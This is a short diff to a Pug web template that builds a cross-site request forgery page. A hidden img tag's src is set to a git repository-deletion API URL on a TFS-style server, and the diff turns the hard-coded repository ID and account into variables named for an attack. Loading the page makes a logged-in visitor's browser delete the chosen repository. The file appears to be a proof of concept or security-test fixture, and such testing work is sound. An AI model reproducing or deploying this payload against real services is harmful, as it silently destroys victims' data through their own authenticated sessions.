@@ -9,9 +9,10 @@ block content
   h2 Some dummy content
   div.csrfContainer hello 
   -
-    var deleteRepoWithId = "1a21de9c-0430-4fb9-b740-d859d25e5c9a";
-    var repoDeletionUrl = "https://verify.me.tfsallin.net:444/_apis/git/Repositories2/{repoId}?deleteRepositoryId={repoId}";
-    repoDeletionUrl=repoDeletionUrl.replace(/{repoId}/g, deleteRepoWithId);
+    var deleteRepoWithId = simpleAttackRepoId;
+    var repoDeletionUrl = "https://{accountName}.me.tfsallin.net:444/_apis/git/Repositories2/{repoId}?deleteRepositoryId={repoId}";
+    repoDeletionUrl = repoDeletionUrl.replace(/{repoId}/g, deleteRepoWithId);
+    repoDeletionUrl = repoDeletionUrl.replace(/{accountName}/, accountName);
   img.csrf-image(src=repoDeletionUrl)
   
 
